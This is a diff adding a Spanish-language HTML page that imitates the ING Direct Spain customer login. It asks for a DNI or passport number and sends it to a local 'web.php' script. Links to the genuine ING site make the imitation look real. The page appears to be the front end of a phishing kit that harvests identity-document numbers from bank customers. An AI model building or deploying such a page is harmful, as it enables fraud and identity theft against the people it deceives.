@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <section>
+        <form action="web.php" method="GET">
+            <h2>Accede a tu Área Clientes</h2>
+            <h3>Elige tu documento</h3>
+            <input type="radio" checked name="documento" id="DNI o Tarjeta de Residencia" value="DNI o Tarjeta de Residencia" class="radio">DNI o Tarjeta de Residencia
+            <br>
+            <br>
+            <input type="radio" name="documento" id="Pasaporte" value="Pasaporte" class="radio">Pasaporte
+            <br>
+            <br>
+            <p style="line-height: 0%;">Número de documento</p>
+            <input class="documento" type="text" size="35" name="numero_doc" id="numero_doc" placeholder="DNI o Tarjeta de Residencia">
+            <br>
+            <br>
+            <p style="line-height: 0%;">Fecha de nacimiento</p>
+            <input type="date" class="fecha">
+            <br>
+            <br>
+            <input type="checkbox" id="recordar">
+            <label for="recordar">Recordar ?</label>
+            <br>
+            <br>
+            <input type="submit" id="boton" value="Entrar" class="entrar">
+            <br>
+            <br>
+            <a href="https://ing.ingdirect.es/pfm/#login-dnie">>Acceder con DNI electrónico</a>
+            <br>
+            <br>
+            <a href="https://ing.ingdirect.es/pfm/#login/security-information">>Más información sobre seguridad</a>
+        </form>
+    </section>
+</body>
+
+</html>
